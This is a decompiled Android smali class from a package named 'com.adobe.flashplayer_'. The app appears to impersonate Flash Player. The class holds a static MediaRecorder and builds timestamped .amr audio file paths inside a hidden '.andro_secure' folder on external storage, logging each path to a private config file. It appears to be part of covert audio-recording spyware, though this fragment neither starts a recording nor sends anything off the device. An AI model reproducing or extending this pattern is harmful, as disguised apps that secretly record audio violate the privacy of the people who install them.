.class public Lcom/adobe/flashplayer_/EEE000;
.super Ljava/lang/Object;
.source "EEE000.java"


# static fields
.field public static recorder:Landroid/media/MediaRecorder;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 25
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private getFilename(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "ab"    # Ljava/lang/String;

    .prologue
    .line 80
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v4}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v1

    .line 81
    .local v1, "filepath":Ljava/lang/String;
    new-instance v0, Ljava/io/File;

    const-string v4, ".andro_secure"

    invoke-direct {v0, v1, v4}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 82
    .local v0, "file":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v4

    if-nez v4, :cond_0

    .line 83
    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    .line 85
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    .line 86
    .local v2, "rnd":J
    const-string v4, "Av"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "/"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ".amr"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {p0, v4, v5, p1}, Lcom/adobe/flashplayer_/EEE000;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 87
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "_"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ".amr"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    return-object v4
.end method

.method private readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "context"    # Landroid/content/Context;

    .prologue
    .line 95
    const-string v4, ""

    .line 97
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p2, p1}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 99
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 100
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 101
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 102
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 103
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 105
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 109
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 110
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 117
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 106
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 113
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 114
    :catch_1
    move-exception v6

    goto :goto_1
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 122
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p3, p1, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 123
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 124
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 128
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 126
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public onPreExecute(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 0
    .param p1, "param"    # Ljava/lang/String;
    .param p2, "param2"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;

    .prologue
    .line 76
    return-void
.end method
